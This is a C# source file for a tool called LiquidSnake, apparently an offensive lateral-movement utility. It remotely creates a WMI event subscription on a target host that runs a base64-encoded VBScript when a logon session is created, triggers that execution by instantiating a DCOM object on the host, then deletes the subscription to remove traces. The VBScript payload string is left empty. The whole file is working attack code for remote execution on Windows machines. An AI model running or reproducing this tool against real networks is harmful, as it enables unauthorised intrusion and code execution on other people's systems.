using System;
using System.Text;
using System.Collections;
using System.Collections.Generic;
using System.Management;

namespace LiquidSnake
{
    class Program
    {

        static void Main(string[] args)
        {
            MoveWMI(args);
        }

        static void MoveWMI(string[] args)
        {
            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;

            if (args.Length < 1)
            {
                Console.WriteLine("[-] Usage: LiquidSnake.exe <host> [<username> <password> <domain>]");
                return;
            }

            string vbscript64 = "";
            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));
            try
            {
                string NAMESPACE = "\\\\" + args[0] + "\\root\\subscription";
                


                ConnectionOptions cOption = new ConnectionOptions();
                ManagementScope scope = null;
                scope = new ManagementScope(NAMESPACE, cOption);

              
                scope.Options.EnablePrivileges = true;
                scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
                scope.Options.Impersonation = ImpersonationLevel.Impersonate;

                if (args.Length == 4)
                {
                    scope.Options.Username = args[1];
                    scope.Options.Password = args[2];
                    scope.Options.Authority = string.Format("ntlmdomain:{0}", args[3]);
                } else
                {
                    Console.WriteLine("[+] Using current user token");
                }

                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";

                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "EventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");

                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "ScriptEventConsumer";
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = vbscript;
                myEventConsumer.Put();

                Console.WriteLine("[*] Event consumer created.");

                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created, now sleeping");

                System.Threading.Thread.Sleep(10000);

                Console.WriteLine("[*] Second some DCOM love..");

                try
                {
                    var CLSID = "C08AFD90-F2A1-11D1-8455-00A0C91F3880";
                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), args[0]);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                }
                 catch( Exception e)
                {

                }

                Console.WriteLine("[*] Sleeping again... long day");
                System.Threading.Thread.Sleep(20000);

                
                myEventFilter.Delete();
                myEventConsumer.Delete();
                myBinder.Delete();



            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } 

        } 
    } 
} 